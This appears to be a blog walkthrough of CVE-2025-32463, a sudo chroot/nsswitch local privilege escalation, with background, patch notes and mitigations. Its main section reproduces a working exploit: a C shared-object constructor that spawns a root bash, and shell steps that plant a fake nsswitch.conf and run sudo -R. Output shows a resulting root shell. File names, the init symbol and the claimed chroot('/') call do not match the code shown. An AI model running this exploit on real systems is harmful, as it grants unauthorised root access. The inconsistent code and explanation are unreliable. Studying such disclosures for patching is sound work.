# __OERVIEW

In this post, we dive into **CVE-2025-32463**, a recently disclosed vulnerability in Sudo’s `-R` (`--chroot`) option  that allows local privilege escalation by abusing `chroot` in combination with how `nsswitch` resolves system resources. Discovered by **Rich Mirch**, this flaw makes It  possible for an attacker to trick sudo into loading an arbitrary shared library by creating an `/etc/nsswitch.conf` file under the user-specified root directory.

---
## Introduction to chroot 
The `chroot`  Option (**short for change root**) is a linux  sudo command that changes the apparent root directory (`/`) for the current running process and its children.

The _chroot(2)_ system call and _chroot(8)_ commands  within  are used to limit the files and directories a process can access on a given file system. This is done by changing the root directory of the process to a given path, restricting its view to files under the path. It essentially puts the process in a **"jail"** 

by default any user can specify a chroot directory, to confirm this we can this command
```
$ sudo -l
```
A value of "*" in the _runchroot= sudoers_ configuration indicates that our lowpriv user may specify the root directory by running _sudo_ with the -R option. An example configuration using this option is shown below.
```none
lowpriv@prod:~$ sudo -l
Matching Defaults entries for lowpriv on prod:
    env_reset,
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty,
    runchroot=*
    User lowpriv may run the following commands on prod:
    (root) /bin/bash
lowpriv@prod:~$ sudo -R /web /bin/bash
bash-5.2#
```
#### Creating a jail environment
To function properly within a chroot jail, the target directory must contain **all required binaries and libraries** needed by chroot such as a shell inside a  bin folder (`/bin/bash`) and essential shared libraries (like `libc`, `libm`, etc.). Without these, the environment may fail to start or function correctly.

Below is an example  Sudo rule. The lowpriv account is allowed to execute `/bin/bash` under `/web`. In this example rule, the user does not pass the chroot directory using the command-line options. Instead, Sudo will `chroot` to `/web` prior to executing `/bin/bash`. Meaning `/web` becomes bash's root directory.

```
sudo chroot=/web /bin/bash
after ch:
/web/bin/bash
```

When the command is executed via Sudo, the root path will be set to `/web`, so` /web/bin/bash` must exist along with any linked libraries. The example below of `lsof` command output shows the lowpriv user running `/bin/bash` under `/web` via `rtd`: (short for root dir).
```none
$ sudo chroot /web /bin/bash
$ lsof 
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME 
bash    160095 root  cwd    DIR  252,0     4096 1048596 /web 
bash    160095 root  rtd    DIR  252,0     4096 1048596 /web 
bash    160095 root  txt    REG  252,0  1446024 1048604 /web/bin/bash 
bash    160095 root  mem    REG  252,0  2125328 1048600 /web/lib/x86…gnu/libc.so.6 
bash    160095 root  mem    REG  252,0   208328 1048601 /web/lib/x86…libtinfo.so.6 
bash    160095 root  mem    REG  252,0   236616 1048602 /web/lib64/ld-…64.so.2 
```
The `rtd` entry in `lsof` confirms that the **root directory** (`/`, from the perspective of the process) has been **changed using `chroot`**, and is now pointing to `/web`.

Additionally, commands like `ls` or `cd` won’t work because their binaries were not copied to  the chroot environment: `/web` , so they simply don’t exist in that directory.

## The nsswitch configuration file

`nsswitch.conf` (short for **Name Service Switch**) is a configuration file in linux   located at `/etc/nsswitch.conf`. nsswitch tells the system **how to resolve names and look up various types of information**  such as usernames, hostnames, groups, passwords, and more.
#### Inside the config file
The following `nsswitch.conf` entries define where the system should look when resolving various types of information:
```
passwd:     files systemd
group:      files
shadow:     files
hosts:      files dns
networks:   files
```
Each line has the format:
```
<database>: <source1> [<source2> ...]
```
For example:

- `hosts: files dns`  
    → When resolving hostnames (e.g., for `ping google.com`), check:
    1. `/etc/hosts` (`files`)
    2. DNS servers (`dns`)
a little detail here
```
passwd: files ldap
```

`files` mean that the system will first look for `passwd` in the `/etc` directory. The `ldap`  after refers to the ldap source which translates  to the shared library: `libnss_ldap.so`. That's how NSS dynamically loads the appropriate library based on the source name.

A **library** is a collection of precompiled code that can be reused by programs. There are two main types:
- **Static libraries** (`.a` files)
    - Linked into the program at **compile time**
    - Code becomes part of the final binary
    - No external dependency at runtime

- **Shared libraries** (`.so` files — **shared objects**)
    - Linked at **runtime**, not baked into the binary
    - Multiple programs can share a single copy in memory

## CVE-2025-32463 (chwoot)

### Sudo chroot Elevation of Privilege Walkthrough

CVE-2025-32463 was introduced in `Sudo v1.9.14` (June 2023) with the update to the _command matching handling code_ when the chroot feature is used.
from update notes:
_Improved command matching when a chroot is specified in sudoers. The sudoers plugin will now change the root directory id needed before performing command matching. Previously, the root directory was simply prepared to the path that was being processed._

The issue arises from allowing an unprivileged user to invoke _chroot()_ on a writable, untrusted path under their control. Sudo calls _chroot()_ several times, regardless of whether the user has corresponding Sudo rule configured.

Allowing a low-privileged user the ability to call _chroot()_ with root authority to a writable location can have various security risks.

### nsswitch abuse
One interesting note that may not be immediately apparent when reading the _nsswitch.conf_ file is that the name of the source is also used as part of the path for a shared object (library). For example
```none
passwd:         files ldap
group:          files ldap
```
the above _ldap_ source translates to `libnss_ldap.so`. When an NSS function uses the _ldap_ source, the library is loaded.


Because of this behavior,  **any local user can trick Sudo into loading  an arbitrary shared object**, via our own `nsswitch` that we put inside the chroot directory as `/web/etc/nsswitch.conf`,  resulting in arbitrary code execution as root. 

To exploit this issue, the following _/etc/nsswitch.conf_ file was placed inside of the chrooted environment. The _/vipa0z_ NSS "source" is translated to _libnss_/vipa0z.so.2, which is a shared object under a path we control.

```none
passwd: /vipa0z
```
The folllowing stack trace shows the malicious shared object that has been loaded by Sudo. 
```none
#0  0x0000763a155db181 in woot () from libnss_/vipa0z.so.2
#1  0x0000763a1612271f in call_init
#8  0x0000763a1612a164 in _dl_open (file="libnss_/vipa0z.so.2", 
#14 0x0000763a15f53a0f in module_load
#15 0x0000763a15f53ee5 in __nss_module_load
#17 0x0000763a15f5460b in __GI___nss_lookup_function
#19 0x0000763a15f50928 in __GI___nss_passwd_lookup2
#20 0x0000763a15f62628 in __getpwnam_r 
#21 0x0000763a15d59ae8 in pam_modutil_getpwnam
#27 0x0000763a15d58d99 in pam_acct_mgmt
#28 0x0000763a1577e491 in sudo_pam_approval
```
![[Pasted image 20250713142948.png]]
## The exploit
with all the ABC out of the way, now for the fun part:
let's start by grapping this  PoC, written by [pr0v3rbst](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) and begin to dissect it
This exploit utilizes a shared library object (`.so`) to create a bash process running as the root user
```c
cat > vipa0z.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF
```
We begin by defining a **constructor function** in C, a special function marked to execute **before `main()` runs**. Inside this constructor, the process’s **effective user ID and group ID** (`euid` and `egid`) are both set to `0`, giving the process **root-level privileges**.

Next, the code calls `chroot("/")`, effectively **breaking out of the chroot jail** by resetting the root directory back to the actual system root (`/`). This bypasses the restricted environment (e.g., `/web`) and restores full access to the real filesystem.
### nsswitch
we then **Create a fake `nsswitch.conf`** inside the `woot` directory and inject the following line:
```shell
mkdir -p woot/etc libnss_
echo "passwd: /vipa0z" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```
This instructs the system to treat `/vipa0z` as the NSS source when resolving user account information (like `/etc/passwd`). When the system sees this entry, it will attempt to load a shared object named `libnss_vipa0z.so`.
```
cp /etc/group /web/etc
```

**Copy `/etc/group`** into the jail so group lookups don’t fail when the process runs in chroot.
    
- **Compile the shared object** (`vipa0z.c`) into a `.so` file and move it to a `/libnss_` directory (the _lib_ folder)
```
gcc -shared -fPIC -Wl,-init,web -o libnss_/vipa0z.so.2 vipa0z.c
```

Executing on Ubuntu 24.04.2 LTS server with `Sudo v1.9.15p5`, using an unprivileged user with no Sudo rules defined, results in a root shell outside of the chrooted environment.
```none
lowpriv@prod:~/CVE-2025-32463$ id
uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)
lowpriv@prod:~/CVE-2025-32463$ sudo -l
[sudo] password for lowpriv:
Sorry, user lowpriv may not run sudo on prod.
lowpriv@prod:~/CVE-2025-32463$ ./sudo-chwoot.sh
woot!
root@prod:/# id
uid=0(root) gid=0(root) groups=0(root),1001(lowpriv)
```

## the sudo Patch?
The patch essentially reverts to the changes implemented in `Sudo 1.9.14`. The _pivot_root()_ and _unpivot_root()_ functions were removed, and _chroot()_ is no longer called during the command matching phase.

With the patch applied, the exploit fails because _chroot()_ is no longer called.
```none
lowpriv@prod:~/CVE-2025-32463$ ./sudo-chwoot.sh
woot!
sudo: the -R option will be removed in a future version of sudo
Password:
sudo: you are not permitted to use the -R option with woot
```
# Mitigations
- Install the latest sudo packages for your system. No workaround exists for this issue.
- The chroot option is now deprecated as of 1.9.17p1. It is recommended to avoid using the chroot options, as this could unintentionally make your environment less secure if not implemented properly.
- Search your environment for any use of the chroot option. Review all Sudo rules defined in /etc/sudoers, and files under /etc/sudoers.d. If the Sudo rules are stored in LDAP, use tools such as ldapsearch to dump the rules.
- Look for the use of the runchroot= option or CHROOT=
- You can search for sudo entries in the syslog. Any commands using chroot will be logged with the CHROOT=

### References
[stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot](https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot)
[nvd.nist.gov/CVE-2025-32462](https://nvd.nist.gov/vuln/detail/CVE-2025-32462)
[www.sudo.ws/advisories/chroot_bug/](https://www.sudo.ws/security/advisories/chroot_bug/)
[https://www.youtube.com/watch?=low-level-code/sudo-chwoot](https://www.youtube.com/watch?v=9nRr3R9gEb8&t=307s)
